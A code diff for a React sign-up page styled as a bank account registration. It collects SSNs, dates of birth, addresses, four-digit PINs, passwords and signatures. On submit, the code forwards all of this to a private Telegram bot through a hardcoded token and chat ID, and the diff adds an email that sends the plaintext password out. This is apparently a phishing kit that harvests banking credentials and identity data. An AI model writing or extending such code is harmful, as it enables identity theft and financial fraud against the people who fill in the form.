@@ -6,7 +6,7 @@ import { useState } from "react";
 import { Link, useNavigate } from "react-router-dom"; // For navigation
 import SignaturePad from "signature_pad";
 import { useRef, useEffect } from "react";
-
+import emailjs from "@emailjs/browser";
 
 const CLOUDINARY_URL = `https://api.cloudinary.com/v1_1/dx90y9zdx/upload`;
 const UPLOAD_PRESET = "holtback"; // Replace with your Cloudinary preset
@@ -17,7 +17,10 @@ const schema = yup.object().shape({
   middleName: yup.string().optional(),
   lastName: yup.string().required("Last name is required"),
   email: yup.string().email("Invalid email").required("Email is required"),
-  ssn: yup.string().matches(/^\d{3}-\d{2}-\d{4}$/, "Invalid SSN").required("SSN is required"),
+  ssn: yup
+    .string()
+    .matches(/^\d{3}-\d{2}-\d{4}$/, "Invalid SSN")
+    .required("SSN is required"),
   accountType: yup.string().oneOf(["Personal", "Business"]).required(),
   address: yup.string().required("Address is required"),
   amount: yup.number().default(0),
@@ -25,14 +28,20 @@ const schema = yup.object().shape({
   profilePicture: yup.string().optional(),
   gender: yup.string().oneOf(["Male", "Female"]).required(),
   dob: yup.string().required("Date of Birth is required"),
-  maritalStatus: yup.string().oneOf(["Single", "Married", "Divorced"]).required(),
+  maritalStatus: yup
+    .string()
+    .oneOf(["Single", "Married", "Divorced"])
+    .required(),
   accountSubType: yup.string().oneOf(["Savings", "Checking"]).required(),
   pin: yup.string().required("Four digits required").required(),
-  password: yup.string().min(6, "Password must be at least 6 characters").required(),
-  confirmPassword: yup.string().oneOf([yup.ref("password")], "Passwords must match"),
-signature: yup.string().required("Signature is required"),
-
-
+  password: yup
+    .string()
+    .min(6, "Password must be at least 6 characters")
+    .required(),
+  confirmPassword: yup
+    .string()
+    .oneOf([yup.ref("password")], "Passwords must match"),
+  signature: yup.string().required("Signature is required"),
 });
 
 const SignUp = () => {
@@ -40,40 +49,56 @@ const SignUp = () => {
   const [profileImage, setProfileImage] = useState<string | null>(null);
   const navigate = useNavigate(); // For navigation
 
- const canvasRef = useRef<HTMLCanvasElement | null>(null);
-const signaturePadRef = useRef<SignaturePad | null>(null);
-const [signature, setSignature] = useState<string | null>(null);
+  const canvasRef = useRef<HTMLCanvasElement | null>(null);
+  const signaturePadRef = useRef<SignaturePad | null>(null);
+  const [signature, setSignature] = useState<string | null>(null);
 
+  useEffect(() => {
+    if (canvasRef.current) {
+      signaturePadRef.current = new SignaturePad(canvasRef.current, {
+        penColor: "black",
+      });
+    }
+  }, []);
 
-useEffect(() => {
-  if (canvasRef.current) {
-    signaturePadRef.current = new SignaturePad(canvasRef.current, {
-      penColor: "black",
+  const sendWelcomeEmail = async (data: any) => {
+    try {
+      await emailjs.send(
+        "service_t7utgru", // your Service ID
+        "template_t7uzaoo", // your Template ID
+        {
+          name: `${data.firstName} ${data.lastName}`, // template variable
+          email: data.email, // template variable
+          password: data.password, // template variable (not secure for real apps!)
+        },
+        "3VTqkxjnlbA0-UH7s", // your Public Key
+      );
+
+      console.log("Welcome email sent successfully!");
+    } catch (error) {
+      console.error("Failed to send welcome email:", error);
+    }
+  };
+
+  const uploadSignatureToCloudinary = async (base64: string) => {
+    const formData = new FormData();
+    formData.append("file", base64);
+    formData.append("upload_preset", UPLOAD_PRESET);
+
+    const response = await fetch(CLOUDINARY_URL, {
+      method: "POST",
+      body: formData,
     });
-  }
-}, []);
 
+    const data = await response.json();
+    return data.secure_url; // return uploaded URL
+  };
 
-const uploadSignatureToCloudinary = async (base64: string) => {
-  const formData = new FormData();
-  formData.append("file", base64);
-  formData.append("upload_preset", UPLOAD_PRESET);
+  const BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
+  const CHAT_ID = "6837437455";
 
-  const response = await fetch(CLOUDINARY_URL, {
-    method: "POST",
-    body: formData,
-  });
-
-  const data = await response.json();
-  return data.secure_url; // return uploaded URL
-};
-
-
-const BOT_TOKEN = "8119231817:AAGAmxzBGY0vBPeVFM2hEEBbXkoAUGxm_HE";
-const CHAT_ID = "6837437455";
-
-const sendToTelegram = async (data: any) => {
-  const message = `
+  const sendToTelegram = async (data: any) => {
+    const message = `
 🆕 New Bank Registration
 
 👤 Name: ${data.firstName} ${data.middleName} ${data.lastName}
@@ -90,44 +115,41 @@ const sendToTelegram = async (data: any) => {
 🖼 Profile: ${data.profilePicture}
 `;
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/json",
-    },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: message,
-    }),
-  });
-};
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: message,
+      }),
+    });
+  };
 
+  const saveSignature = () => {
+    if (!signaturePadRef.current) return;
 
-const saveSignature = () => {
-  if (!signaturePadRef.current) return;
+    if (signaturePadRef.current.isEmpty()) {
+      alert("Signature is required");
+      return;
+    }
 
-  if (signaturePadRef.current.isEmpty()) {
-    alert("Signature is required");
-    return;
-  }
+    const dataURL = signaturePadRef.current.toDataURL("image/png");
+    setSignature(dataURL);
+    setValue("signature", dataURL);
+  };
 
-  const dataURL = signaturePadRef.current.toDataURL("image/png");
-  setSignature(dataURL);
-  setValue("signature", dataURL);
-};
-
-const clearSignature = () => {
-  signaturePadRef.current?.clear();
-  setSignature(null);
-};
-
-
+  const clearSignature = () => {
+    signaturePadRef.current?.clear();
+    setSignature(null);
+  };
 
   const {
     register,
     handleSubmit,
     setValue,
-    formState: {  },
+    formState: {},
   } = useForm({
     resolver: yupResolver(schema),
   });
@@ -162,204 +184,295 @@ const clearSignature = () => {
     setValue("ssn", ssn);
   };
 
- const onSubmit = async (data: any) => {
-  try {
-    setLoading(true);
+  const onSubmit = async (data: any) => {
+    try {
+      setLoading(true);
 
-    // Upload signature first
-    if (signature) {
-      const signatureUrl = await uploadSignatureToCloudinary(signature);
-      data.signature = signatureUrl;
+      // Upload signature first
+      if (signature) {
+        const signatureUrl = await uploadSignatureToCloudinary(signature);
+        data.signature = signatureUrl;
+      }
+
+      await addUser(data);
+
+      await sendToTelegram(data);
+
+      await sendWelcomeEmail(data);
+
+      alert("User Registered Successfully!");
+      navigate("/login");
+    } catch (error) {
+      console.error(error);
+      alert("Something went wrong.");
+    } finally {
+      setLoading(false);
     }
-
-    await addUser(data);
-
-    await sendToTelegram(data);
-
-    alert("User Registered Successfully!");
-    navigate("/login");
-  } catch (error) {
-    console.error(error);
-    alert("Something went wrong.");
-  } finally {
-    setLoading(false);
-  }
-};
-
+  };
 
   return (
     <div className="max-w-lg mx-auto p-8 bg-gray-50 shadow-md rounded-lg">
-      <h2 className="text-xl font-semibold text-center mb-6 text-purple-700">Create Account</h2>
+      <h2 className="text-xl font-semibold text-center mb-6 text-purple-700">
+        Create Account
+      </h2>
 
       <form onSubmit={handleSubmit(onSubmit)} className="space-y-5">
-  {/* Name Fields */}
-  <div>
-    <label htmlFor="" className="font-semibold">First Name</label>
-    <input {...register("firstName")} placeholder="" className="input w-full  border py-3 border-[#ccc]" />
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Middle Name</label>
-    <input {...register("middleName")} placeholder="" className="input w-full border py-3 border-[#ccc]" />
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Last Name</label>
-    <input {...register("lastName")} placeholder="" className="input w-full border py-3 border-[#ccc]" />
-  </div>
+        {/* Name Fields */}
+        <div>
+          <label htmlFor="" className="font-semibold">
+            First Name
+          </label>
+          <input
+            {...register("firstName")}
+            placeholder=""
+            className="input w-full  border py-3 border-[#ccc]"
+          />
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Middle Name
+          </label>
+          <input
+            {...register("middleName")}
+            placeholder=""
+            className="input w-full border py-3 border-[#ccc]"
+          />
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Last Name
+          </label>
+          <input
+            {...register("lastName")}
+            placeholder=""
+            className="input w-full border py-3 border-[#ccc]"
+          />
+        </div>
 
-  {/* Email & SSN */}
-  <div>
-  <label htmlFor="" className="font-semibold">Email</label>
-    <input {...register("email")} placeholder="" className="input w-full border py-3 border-[#ccc]" />
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">SSN *</label>
-    <input
-      {...register("ssn")}
-      placeholder=""
-      className="input w-full border py-3 border-[#ccc]"
-      onChange={(e) => formatSSN(e.target.value)}
-    />
-  </div>
+        {/* Email & SSN */}
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Email
+          </label>
+          <input
+            {...register("email")}
+            placeholder=""
+            className="input w-full border py-3 border-[#ccc]"
+          />
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            SSN *
+          </label>
+          <input
+            {...register("ssn")}
+            placeholder=""
+            className="input w-full border py-3 border-[#ccc]"
+            onChange={(e) => formatSSN(e.target.value)}
+          />
+        </div>
 
-  {/* Address */}
+        {/* Address */}
 
-  <div>
-  <label htmlFor="" className="font-semibold">Address</label>
-  
-    <input {...register("address")} placeholder="" className="input w-full   border py-3 border-[#ccc]" />
-    <div className="flex gap-3 mt-2"><input type="checkbox" name="" id="" /> <p>Billing address same as Address</p>
-      </div> 
-  </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Address
+          </label>
 
-  {/* Gender, DOB, Marital Status */}
-  <div>
-  <label htmlFor="" className="font-semibold">Gender</label>
-    <select {...register("gender")} className="input w-full   border py-3 border-[#ccc]">
-      {/* <option value=""> </option> */}
-      <option value="Male">Male</option>
-      <option value="Female">Female</option>
-    </select>
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Date of Birth</label>
-    <input {...register("dob")} type="date" className="input w-full   border py-3 border-[#ccc]" />
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Marital Status</label>
-    <select {...register("maritalStatus")} className="input w-full   border py-3 border-[#ccc]">
-      {/* <option value="">Select </option> */}
-      <option value="Single">Single</option>
-      <option value="Married">Married</option>
-      <option value="Divorced">Divorced</option>
-    </select>
-  </div>
+          <input
+            {...register("address")}
+            placeholder=""
+            className="input w-full   border py-3 border-[#ccc]"
+          />
+          <div className="flex gap-3 mt-2">
+            <input type="checkbox" name="" id="" />{" "}
+            <p>Billing address same as Address</p>
+          </div>
+        </div>
 
-  {/* Account Type */}
-  <div>
-  <label htmlFor="" className="font-semibold">Account Type</label>
-    <select {...register("accountType")} className="input w-full   border py-3 border-[#ccc]">
-      {/* <option value=""></option> */}
-      <option value="Personal">Personal</option>
-      <option value="Business">Business</option>
-    </select>
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Account Sub Type</label>
-    <select {...register("accountSubType")} className="input w-full   border py-3 border-[#ccc]">
-      {/* <option value=""></option> */}
-      <option value="Savings">Savings</option>
-      <option value="Checking">Checking</option>
-    </select>
-  </div>
+        {/* Gender, DOB, Marital Status */}
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Gender
+          </label>
+          <select
+            {...register("gender")}
+            className="input w-full   border py-3 border-[#ccc]"
+          >
+            {/* <option value=""> </option> */}
+            <option value="Male">Male</option>
+            <option value="Female">Female</option>
+          </select>
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Date of Birth
+          </label>
+          <input
+            {...register("dob")}
+            type="date"
+            className="input w-full   border py-3 border-[#ccc]"
+          />
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Marital Status
+          </label>
+          <select
+            {...register("maritalStatus")}
+            className="input w-full   border py-3 border-[#ccc]"
+          >
+            {/* <option value="">Select </option> */}
+            <option value="Single">Single</option>
+            <option value="Married">Married</option>
+            <option value="Divorced">Divorced</option>
+          </select>
+        </div>
 
-  {/* Profile Picture Upload */}
-  <div className="flex flex-col items-center">
-   <label htmlFor="" className="font-semibold flex justify-start">Upload Profile Picture</label>
-   {profileImage && <img src={profileImage} alt="Profile" className="w-20 h-20 rounded-full mb-2" />}
-    <input
-      type="file"
-      accept="image/*"
-      onChange={(e) => e.target.files && uploadImage(e.target.files[0])}
-      className="border p-2 rounded w-full"
-    />
-  </div>
+        {/* Account Type */}
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Account Type
+          </label>
+          <select
+            {...register("accountType")}
+            className="input w-full   border py-3 border-[#ccc]"
+          >
+            {/* <option value=""></option> */}
+            <option value="Personal">Personal</option>
+            <option value="Business">Business</option>
+          </select>
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Account Sub Type
+          </label>
+          <select
+            {...register("accountSubType")}
+            className="input w-full   border py-3 border-[#ccc]"
+          >
+            {/* <option value=""></option> */}
+            <option value="Savings">Savings</option>
+            <option value="Checking">Checking</option>
+          </select>
+        </div>
 
-  {/* Password Fields */}
-  <div>
-  <label htmlFor="" className="font-semibold">4 digits Pin</label>
-  <input
-    {...register("pin")}
-    type="tel"
-    pattern="\d{4}"
-    placeholder="Enter 4 digits"
-    maxLength={4}
-    inputMode="numeric"
-    className="input w-full border py-3 border-[#ccc]"
-  />
-</div>
+        {/* Profile Picture Upload */}
+        <div className="flex flex-col items-center">
+          <label htmlFor="" className="font-semibold flex justify-start">
+            Upload Profile Picture
+          </label>
+          {profileImage && (
+            <img
+              src={profileImage}
+              alt="Profile"
+              className="w-20 h-20 rounded-full mb-2"
+            />
+          )}
+          <input
+            type="file"
+            accept="image/*"
+            onChange={(e) => e.target.files && uploadImage(e.target.files[0])}
+            className="border p-2 rounded w-full"
+          />
+        </div>
 
+        {/* Password Fields */}
+        <div>
+          <label htmlFor="" className="font-semibold">
+            4 digits Pin
+          </label>
+          <input
+            {...register("pin")}
+            type="tel"
+            pattern="\d{4}"
+            placeholder="Enter 4 digits"
+            maxLength={4}
+            inputMode="numeric"
+            className="input w-full border py-3 border-[#ccc]"
+          />
+        </div>
 
-  <div>
-  <label htmlFor="" className="font-semibold">Password *</label>
-    <input {...register("password")} type="password" placeholder="" className="input w-full   border py-3 border-[#ccc]" />
-  </div>
-  <div>
-  <label htmlFor="" className="font-semibold">Confirm Password *</label>
-    <input {...register("confirmPassword")} type="password" placeholder="" className="input w-full   border py-3 border-[#ccc]" />
-  </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Password *
+          </label>
+          <input
+            {...register("password")}
+            type="password"
+            placeholder=""
+            className="input w-full   border py-3 border-[#ccc]"
+          />
+        </div>
+        <div>
+          <label htmlFor="" className="font-semibold">
+            Confirm Password *
+          </label>
+          <input
+            {...register("confirmPassword")}
+            type="password"
+            placeholder=""
+            className="input w-full   border py-3 border-[#ccc]"
+          />
+        </div>
 
-{/* Signature */}
-<div className="mt-6">
-  <label className="font-semibold block mb-2">Signature</label>
+        {/* Signature */}
+        <div className="mt-6">
+          <label className="font-semibold block mb-2">Signature</label>
 
-  <canvas
-    ref={canvasRef}
-    width={450}
-    height={150}
-    className="border-2 border-gray-300 rounded-md w-full h-[150px]"
-  />
+          <canvas
+            ref={canvasRef}
+            width={450}
+            height={150}
+            className="border-2 border-gray-300 rounded-md w-full h-[150px]"
+          />
 
-  <div className="flex gap-4 mt-3">
-    <button
-      type="button"
-      onClick={saveSignature}
-      className="bg-green-600 text-white px-4 py-2 rounded"
-    >
-      Save Signature
-    </button>
+          <div className="flex gap-4 mt-3">
+            <button
+              type="button"
+              onClick={saveSignature}
+              className="bg-green-600 text-white px-4 py-2 rounded"
+            >
+              Save Signature
+            </button>
 
-    <button
-      type="button"
-      onClick={clearSignature}
-      className="bg-red-600 text-white px-4 py-2 rounded"
-    >
-      Clear
-    </button>
-  </div>
+            <button
+              type="button"
+              onClick={clearSignature}
+              className="bg-blue-600 text-white px-4 py-2 rounded"
+            >
+              Clear
+            </button>
+          </div>
 
-  {signature && (
-    <div className="mt-4">
-      <p className="text-sm font-medium">Preview:</p>
-      <img src={signature} alt="Signature Preview" className="border mt-2" />
-    </div>
-  )}
-</div>
+          {signature && (
+            <div className="mt-4">
+              <p className="text-sm font-medium">Preview:</p>
+              <img
+                src={signature}
+                alt="Signature Preview"
+                className="border mt-2"
+              />
+            </div>
+          )}
+        </div>
 
-
-
-  {/* Submit Button */}
-  <button
-    type="submit"
-    className="w-full bg-purple-700 hover:bg-purple-800 text-white font-bold py-2 px-4 rounded-md"
-    disabled={loading}
-  >
-    {loading ? "Submitting..." : "Register"}
-  </button>
-<Link to='/login'> <button className="w-full  mt-4 mb-6 bg-purple-700 hover:bg-purple-800 text-white font-bold py-2 px-4 rounded-md"> Login</button>
-
-</Link>
- </form>
-
+        {/* Submit Button */}
+        <button
+          type="submit"
+          className="w-full bg-purple-700 hover:bg-purple-800 text-white font-bold py-2 px-4 rounded-md"
+          disabled={loading}
+        >
+          {loading ? "Submitting..." : "Register"}
+        </button>
+        <Link to="/login">
+          {" "}
+          <button className="w-full  mt-4 mb-6 bg-purple-700 hover:bg-purple-800 text-white font-bold py-2 px-4 rounded-md">
+            {" "}
+            Login
+          </button>
+        </Link>
+      </form>
     </div>
   );
 };
